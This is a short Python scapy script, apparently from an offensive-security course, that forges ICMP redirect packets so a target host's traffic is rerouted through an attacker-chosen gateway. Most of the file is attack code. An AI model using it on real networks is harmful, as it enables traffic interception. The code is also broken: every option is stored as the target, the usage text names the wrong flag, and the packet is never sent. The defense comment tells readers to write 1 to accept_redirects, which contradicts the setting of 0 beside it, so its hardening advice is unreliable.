# Offensive Security Software
# SSE Program
# Attack: ICMP Redirector
# Date: January 31, 2016
# Description:  ICMP-Redirection only needs a single packet to intercept the
# whole traffic to a specified route like a default gateway.  ICMP is used to
# tell computers that another host or network is unreachable, that the TTL of
# a packet got exceeded or that a router thinks it knows it a quicker route
# to your destination and you should that in future connections.  

import sys
import getopt
from scapy.all import send, IP, ICMP



class Redirect():
    target = None
    old_gw = None
    new_gw = None

    def __init__(self, target, old_gw, new_gw):
        self.target = target
        self.old_gw = old_gw
        self.new_gw = new_gw

    def send(self):
        packet = IP(src=self.old_gw, dst=self.target) / \
        ICMP(type=5, code=1, gw=self.new_gw) / \
        IP(src=self.target, dst="0.0.0.0")
        send(packet)

def usage():
    print sys.argv[0] + """
    -f target
    -o old_gw
    -n new-gw """
    sys.exit(1)


if __name__=='__main__':

    try:
        cmd_opts = "t:o:n:r:"
        opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
    except getopt.GetoptError:
        usage()


    for opt in opts:
        if opt[0] == "-t":
            target = opt[1]
        elif opt[0] == "-o":
            target = opt[1]
        elif opt[0] == "-n":
            target = opt[1]
        else:
            usage()

'''
TO defend against ICMP redirection attacks, make the following changes:

echo 1 > /proc/sys/net/ipv4/conf/all/accept_redirects

OR edit /etc/systctl.conf and set
    net.ipv4.conf.all.accept_redirects = 0
'''
